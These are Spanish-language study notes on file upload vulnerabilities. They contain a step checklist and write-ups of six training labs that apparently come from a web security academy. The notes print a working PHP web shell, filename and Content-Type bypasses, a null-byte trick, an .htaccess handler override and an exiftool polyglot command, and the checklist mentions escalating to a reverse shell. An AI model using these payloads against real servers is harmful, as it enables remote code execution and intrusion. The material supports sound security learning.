------
### QUE ES?
Una **File Upload Vulnerability** es una vulnerabilidad donde un atacante puede **subir archivos maliciosos al servidor** a través de funcionalidades de carga de archivos (por ejemplo, subir imágenes o documentos).  
Ocurre cuando la aplicación **no valida correctamente el tipo, contenido o extensión del archivo subido**.  
Esto puede permitir subir **scripts ejecutables (como PHP, JSP o ASP)** que el servidor ejecuta, lo que puede derivar en **Remote Code Execution (RCE)**, acceso a archivos del sistema o control del servidor.  
Se previene validando correctamente **tipo MIME, extensión, contenido real del archivo**, almacenando los archivos fuera del directorio web y **evitando que los uploads sean ejecutables**.
#### PASOS:
- _IDENTIFICAR FUNCIONALIDAD DE SUBIDA:_ localizar formularios que permitan subir archivos (`multipart/form-data`).
- _SUBIR UN ARCHIVO MALICIOSO:_ probar con una **webshell**, `<?php system($_GET['cmd']); ?>`
- _CAMBIAR EXTENSIONES:_ si `.php` está bloqueado probar `.php5` `.phtml` `.php.jpg` `.php.png`
- _BYPASS DE VALIDACIONES:_ modificar el **Content-Type** en la petición `Content-Type: image/jpeg`
- _DOUBLE EXTENSION:_ `shell.php.jpg`
- _NULL BYTE (si el backend es vulnerable):_ `shell.php%00.jpg`
- _COMPROBAR EJECUCIÓN:_ acceder al archivo subido `/uploads/shell.php?cmd=id`
- _ESCALAR ATAQUE:_ ejecutar comandos, leer archivos (`/etc/passwd`) o establecer una **reverse shell**.
### LAB1: REMOTE CODE EXECUTION VIA WEB SHELL UPLOAD
En este primer lab vemos un apartado para subir una foto de perfil o avatar. Podemos probar si está sanitizada la subida de archivos pero vemos que no hace ningun tipo de validación.
Podemos subir algo como esto para tener ejecucion remota de comandos:
`<?php
	`system($_GET['cmd']);
`?>
### LAB2: WEB SHELL UPLOAD VIA CONTENT-TYPE RESTRICTION BYPASS
En este lab pasa un poco lo mismo, intentamos subir la *web shell* pero nos damos cuenta de que no nos permite subir archivos con *Content-Type: application/x-php*. Probamos a cambiar el *Content-Type* desde *burpsuite* a *image/jpeg* y lo bypaseamos. 
`<?php
	`system($_GET['cmd']);
`?>
### LAB3: WEB SHELL UPLOAD VIA PATH TRAVERSAL
En este lab nos volvemos a encontrar con el apartado de subida de archivos. Tratamos de subir una *web shell* pero vemos que el servidor no interpreta *php* en la carpeta que se sube. Podemos probar un *path traversal* modificando el `Content-Disposition: filename="../shell.php"` pero veremos que en el mensaje de respuesta sigue saliendo que lo sube a *avatars* por lo que el *path traversal* no se esta haciendo. La solución es ofuscarlo a `Content-Disposition: filename="..%2fshell.php"` obteniendo la *web shell*.
### LAB4: WEB SHELL UPLOAD VIA EXTENSION BLACKLIST BYPASS
En este lab tenemos un apartado para subir una foto de perfil, podemos probar a subir una web shell pero vemos que no os permite subir php. Para bypassearlo podemos subir un .htaccess que contenga `AddType application/x-httpd-php .133t` esto indica al servidor que los archivos con la extensión `.133t` deben ser interpretados como código PHP. Una vez hecho esto subimos nuestra *shell.php* pero cambiando la extension a *shell.133t*
### LAB5: WEB SHELL UPLOAD VIA OBFUSCATED FILE EXTENSION
En este lab tenemos un apartado para subir una foto de perfil, podemos probar a subir una web shell pero vemos que solo podemos subir *.jpg* y *.png*. Podemos probar a meter un *null byte* despues de la extension *.php* de tal manera que valide que no es un archivo *php* pero que no se ejecute lo que vaya detras del *null byte*.
`filename=shell.php%00.jpg`
### LAB6: REMOTE CODE EXECUTION VIA POLYGLOT WEB SHELL
Un **archivo polyglot** es un archivo diseñado para ser **válido en varios formatos a la vez**.
En este laboratorio tambien tenemos el apartado para subir una foto de perfil, pero no nos deja subir *php*. Podemos probar un archivo *polyglot*, para ello nos descargamos un *.jpg* y con la herramienta *exiftool image.jpg* podemos ver los metadatos. Se trata de meter el codigo *php* dentro de estos metadatos con `exiftool -Comment '<?php system($_GET['cmd']) ?>' -o polyglot.php` una vez lo tenemos lo subimos. Al apuntar al `cmd=COMANDO`en la url veremos que nos printea muchos caracteres, filtar con *ctrl + f*

